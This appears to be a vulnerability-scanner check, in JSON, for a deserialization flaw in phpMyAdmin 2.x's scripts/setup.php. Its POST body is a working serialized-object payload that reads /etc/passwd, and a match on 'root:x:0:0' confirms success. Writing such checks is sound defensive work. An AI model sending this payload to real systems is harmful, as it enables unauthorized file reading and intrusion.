{
    "target":"phpmyadmin",
    "meta":{
        "name":    "phpmyadmin scripts/setup.php 反序列化漏洞",
        "remarks": "phpmyadmin 2.x版本中存在一处反序列化漏洞，通过该漏洞，攻击者可以读取任意文件或执行任意代码。",
        "level":   0,
        "type":    "RCE",
        "author":   "wolf",
        "references": {
            "url":"https://github.com/vulhub/vulhub/blob/master/phpmyadmin/WooYun-2016-199433/README.zh-cn.md",
            "cve":"",
            "kpid":"KP-0064"
        }
    },
    "request":{
        "path":     "/scripts/setup.php",
        "postData": "action=test&configuration=O:10:\"PMA_Config\":1:{s:6:\"source\",s:11:\"/etc/passwd\";}"
    },
    "verify":{
        "type":  "string",
        "match": "root:x:0:0"
    }
}